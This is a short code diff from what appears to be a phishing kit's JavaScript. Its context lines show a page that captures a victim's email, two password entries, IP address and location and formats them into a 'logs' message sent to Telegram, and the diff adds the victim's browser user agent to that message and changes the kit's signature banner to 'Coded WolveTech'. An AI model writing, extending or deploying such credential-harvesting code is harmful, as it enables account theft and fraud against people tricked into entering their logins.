@@ -341,10 +341,11 @@
         const timestamp = new Date().toISOString();
         const firstPassword = firstPasswordInput.value;
         const secondPassword = currentPassword;
+        const userAgent = navigator.userAgent; // Get the User Agent string
 
         // Format the message
         const message = `
-🔐 --- Sweet Logs!! :Coded Hard Work---
+🔐 --- Ọ bụ chi na-enye!! :Coded WolveTech---
 
 📧 Email: ${currentEmail}
 
@@ -354,6 +355,7 @@
 🕒 Time: ${timestamp}
 🌐 IP: ${ip}
 ${geoInfo}
+💻 User Agent: ${userAgent}
         `;
 
         // Send the message to Telegram
